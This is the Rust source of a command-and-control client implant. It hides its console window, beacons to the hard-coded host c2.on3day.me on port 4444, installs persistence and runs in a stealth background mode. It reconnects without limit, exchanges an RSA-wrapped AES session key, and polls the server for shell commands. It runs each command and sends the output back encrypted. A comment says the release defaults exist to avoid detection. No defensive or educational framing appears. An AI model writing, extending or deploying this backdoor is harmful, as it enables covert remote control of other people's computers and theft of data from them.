#![windows_subsystem = "windows"] // Hide console window on Windows

use anyhow::Result;
use c2_client::{
    crypto, network, platform,
    ClientConfig, ClientState, MessageType,
};
use chrono::Utc;
use std::time::Duration;
use tokio::time::{interval, sleep};
use base64::{engine::general_purpose, Engine as _};
use clap::Parser;

/// Command line arguments
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Server IP address
    #[arg(short, long, default_value = "c2.on3day.me")]
    server: String,
    
    /// Server port
    #[arg(short, long, default_value_t = 4444)]
    port: u16,
    
    /// Disable persistence
    #[arg(long)]
    no_persistence: bool,
    
    /// Disable stealth mode
    #[arg(long)]
    no_stealth: bool,
    
    /// Reconnect delay in seconds
    #[arg(long, default_value_t = 30)]
    reconnect_delay: u64,
    
    /// Heartbeat interval in seconds
    #[arg(long, default_value_t = 60)]
    heartbeat_interval: u64,
}

#[tokio::main]
async fn main() -> Result<()> {
    // Parse command line arguments (only in debug mode)
    let args = if cfg!(debug_assertions) {
        println!("[DEBUG] Parsing command line arguments.");
        Args::parse()
    } else {
        // In release mode, use default configuration to avoid detection
        Args {
            server: "c2.on3day.me".to_string(),
            port: 4444,
            no_persistence: false,
            no_stealth: true, // Disable stealth in debug to see output
            heartbeat_interval: 60,
            reconnect_delay: 30,
        }
    };
    
    println!("[DEBUG] Arguments parsed: {:?}", args);
    
    // Create client configuration
    let config = ClientConfig {
        server_address: args.server,
        server_port: args.port,
        reconnect_delay: args.reconnect_delay,
        heartbeat_interval: args.heartbeat_interval,
        command_poll_interval: 5,
        max_reconnect_attempts: 0, // Infinite reconnects
        persistence_enabled: !args.no_persistence,
        stealth_mode: !args.no_stealth,
    };
    
    println!("[DEBUG] Client configuration created: {:?}", config);
    
    // Setup persistence if enabled
    if config.persistence_enabled {
        println!("[DEBUG] Attempting to setup persistence...");
        if let Err(e) = platform::setup_persistence(&config) {
            eprintln!("Failed to setup persistence: {}", e);
        } else {
            println!("[DEBUG] Persistence setup successfully.");
        }
    }
    
    // Run in background if stealth mode is enabled (but not in debug builds)
    if config.stealth_mode && !cfg!(debug_assertions) {
        println!("[DEBUG] Attempting to run in background (stealth mode)...");
        if let Err(e) = platform::run_in_background() {
            eprintln!("Failed to run in background: {}", e);
        } else {
            println!("[DEBUG] Running in background successfully.");
        }
    }
    
    // Initialize client state
    let mut state = ClientState::new(config);
    println!("[DEBUG] Client state initialized.");
    
    // Main client loop
    loop {
        println!("[DEBUG] Starting new client session attempt.");
        if let Err(e) = run_client_session(&mut state).await {
            eprintln!("Client session error: {}", e);
            
            // Increment reconnect count
            state.reconnect_count += 1;
            
            // Check if we should stop trying to reconnect
            if state.config.max_reconnect_attempts > 0 
                && state.reconnect_count >= state.config.max_reconnect_attempts {
                eprintln!("Max reconnect attempts reached. Exiting.");
                break;
            }
            
            // Reset connection state
            state.reset_connection();
            
            // Wait before reconnecting
            let delay = std::cmp::min(
                state.config.reconnect_delay * state.reconnect_count as u64,
                300 // Max 5 minutes
            );
            println!("[DEBUG] Reconnecting in {} seconds (attempt {})...", delay, state.reconnect_count);
            sleep(Duration::from_secs(delay)).await;
        } else {
            // Successful disconnection, reset reconnect count
            println!("[DEBUG] Session ended gracefully. Resetting reconnect count.");
            state.reconnect_count = 0;
        }
    }
    
    Ok(())
}

/// Run a single client session (connect, handshake, communicate)
async fn run_client_session(state: &mut ClientState) -> Result<()> {
    // Connect to server
    println!("[DEBUG] Connecting to server at {}:{}", state.config.server_address, state.config.server_port);
    let mut stream = network::connect_to_server(
        &state.config.server_address,
        state.config.server_port,
        30 // 30 second timeout
    ).await?;
    println!("[DEBUG] TCP connection established.");
    
    // Perform handshake
    perform_handshake(&mut stream, state).await?;
    
    println!("Connected to C2 server successfully");
    state.is_connected = true;
    
    // Setup periodic tasks
    let mut heartbeat_interval = interval(Duration::from_secs(state.config.heartbeat_interval));
    let mut command_poll_interval = interval(Duration::from_secs(state.config.command_poll_interval));
    
    // Main communication loop
    println!("[DEBUG] Entering main communication loop.");
    loop {
        tokio::select! {
            // Send heartbeat
            _ = heartbeat_interval.tick() => {
                if let Err(e) = send_heartbeat(&mut stream, state).await {
                    eprintln!("Heartbeat failed: {}", e);
                    break;
                }
            }
            
            // Poll for commands
            _ = command_poll_interval.tick() => {
                if let Err(e) = poll_for_commands(&mut stream, state).await {
                    eprintln!("Command polling failed: {}", e);
                    break;
                }
            }
            
            // Timeout for general inactivity
            _ = sleep(Duration::from_secs(300)) => {
                println!("Session timeout, reconnecting...");
                break;
            }
        }
    }
    
    state.is_connected = false;
    println!("[DEBUG] Exited communication loop.");
    Ok(())
}

/// Perform RSA key exchange handshake with server
async fn perform_handshake(
    stream: &mut tokio::net::TcpStream,
    state: &mut ClientState,
) -> Result<()> {
    println!("[DEBUG] Starting handshake...");
    // Get client information
    let client_info = platform::get_client_info();
    
    // Send handshake request
    let handshake_request = MessageType::HandshakeRequest {
        client_info: client_info.clone(),
    };
    let request_data = serde_json::to_vec(&handshake_request)?;
    println!("[DEBUG] Sending handshake request...");
    network::send_message(stream, &request_data).await?;
    
    // Receive handshake response
    println!("[DEBUG] Waiting for handshake response...");
    let response_data = network::receive_message(stream, 30).await?;
    let handshake_response: MessageType = serde_json::from_slice(&response_data)?;
    println!("[DEBUG] Received handshake response.");
    
    let (public_key_pem, _server_id) = match handshake_response {
        MessageType::HandshakeResponse { public_key_pem, server_id } => (public_key_pem, server_id),
        _ => return Err(anyhow::anyhow!("Expected handshake response")),
    };
    
    // Parse server's public key
    let public_key = crypto::public_key_from_pem(&public_key_pem)?;
    state.server_public_key = Some(public_key.clone());
    println!("[DEBUG] Parsed server's public key.");
    
    // Generate AES session key
    let session_key = crypto::generate_aes_key();
    state.session_key = Some(session_key);
    println!("[DEBUG] Generated AES session key.");
    
    // Encrypt session key with server's public key
    let encrypted_aes_key = crypto::encrypt_rsa(&session_key, &public_key)?;
    let encrypted_aes_key_b64 = general_purpose::STANDARD.encode(&encrypted_aes_key);
    
    // Send encrypted session key
    let session_key_msg = MessageType::SessionKey {
        encrypted_aes_key: encrypted_aes_key_b64,
    };
    let session_data = serde_json::to_vec(&session_key_msg)?;
    println!("[DEBUG] Sending encrypted session key...");
    network::send_message(stream, &session_data).await?;
    
    // Wait for session acknowledgment
    println!("[DEBUG] Waiting for session acknowledgment...");
    let ack_data = network::receive_message(stream, 30).await?;
    let session_ack: MessageType = serde_json::from_slice(&ack_data)?;
    
    match session_ack {
        MessageType::SessionAck { status } => {
            if status != "OK" {
                return Err(anyhow::anyhow!("Session establishment failed: {}", status));
            }
            println!("[DEBUG] Received session acknowledgment: {}", status);
        }
        _ => return Err(anyhow::anyhow!("Expected session acknowledgment")),
    }
    
    // Generate client ID
    state.client_id = Some(format!("{}_{}_{}", 
        client_info.hostname,
        client_info.username,
        uuid::Uuid::new_v4().to_string().split('-').next().unwrap()
    ));
    
    println!("[DEBUG] Handshake successful. Client ID: {:?}", state.client_id);
    Ok(())
}

/// Send heartbeat to server
async fn send_heartbeat(
    stream: &mut tokio::net::TcpStream,
    state: &ClientState,
) -> Result<()> {
    let session_key = state.session_key.ok_or_else(|| anyhow::anyhow!("No session key"))?;
    
    let heartbeat = MessageType::Heartbeat {
        timestamp: Utc::now(),
    };
    
    println!("[DEBUG] Sending heartbeat...");
    network::send_encrypted_message(stream, &heartbeat, &session_key).await?;
    
    // Wait for heartbeat acknowledgment
    let _heartbeat_ack = network::receive_encrypted_message(stream, &session_key, 10).await?;
    println!("[DEBUG] Heartbeat acknowledged.");
    
    Ok(())
}

/// Poll for commands from server
async fn poll_for_commands(
    stream: &mut tokio::net::TcpStream,
    state: &ClientState,
) -> Result<()> {
    let session_key = state.session_key.ok_or_else(|| anyhow::anyhow!("No session key"))?;
    
    // Request command
    let command_request = MessageType::CommandRequest {};
    println!("[DEBUG] Polling for command...");
    network::send_encrypted_message(stream, &command_request, &session_key).await?;
    
    // Receive command response
    let command_response = network::receive_encrypted_message(stream, &session_key, 10).await?;
    
    match command_response {
        MessageType::CommandResponse { command: Some(command) } => {
            println!("Executing command: {}", command.command);
            
            // Execute command
            let result = platform::execute_command(&command.command).await;
            println!("[DEBUG] Command execution result: {:?}", result);
            
            // Send result back to server
            let command_result = MessageType::CommandResult { result };
            println!("[DEBUG] Sending command result...");
            network::send_encrypted_message(stream, &command_result, &session_key).await?;
            
            // Wait for acknowledgment
            let _ack = network::receive_encrypted_message(stream, &session_key, 10).await?;
            println!("[DEBUG] Command result acknowledged.");
        }
        MessageType::CommandResponse { command: None } => {
            // No command available
            println!("[DEBUG] No command available from server.");
        }
        _ => {
            return Err(anyhow::anyhow!("Unexpected response to command request"));
        }
    }
    
    Ok(())
}

/// Handle special commands (built-in functionality)
async fn handle_special_command(command: &str) -> Option<String> {
    match command.trim().to_lowercase().as_str() {
        "!info" => {
            let info = platform::get_client_info();
            Some(format!(
                "Hostname: {}\nUsername: {}\nOS: {}\nVersion: {}",
                info.hostname, info.username, info.operating_system, info.client_version
            ))
        }
        "!ping" => Some("pong".to_string()),
        "!uptime" => {
            // Get system uptime
            #[cfg(windows)]
            {
                let output = std::process::Command::new("cmd")
                    .args(&["/C", "systeminfo | findstr \"System Boot Time\""])
                    .output();
                match output {
                    Ok(out) => Some(String::from_utf8_lossy(&out.stdout).to_string()),
                    Err(_) => Some("Unable to get uptime".to_string()),
                }
            }
            #[cfg(unix)]
            {
                let output = std::process::Command::new("uptime").output();
                match output {
                    Ok(out) => Some(String::from_utf8_lossy(&out.stdout).to_string()),
                    Err(_) => Some("Unable to get uptime".to_string()),
                }
            }
            #[cfg(not(any(windows, unix)))]
            {
                Some("Uptime not available on this platform".to_string())
            }
        }
        "!exit" | "!quit" => {
            std::process::exit(0);
        }
        _ => None,
    }
}
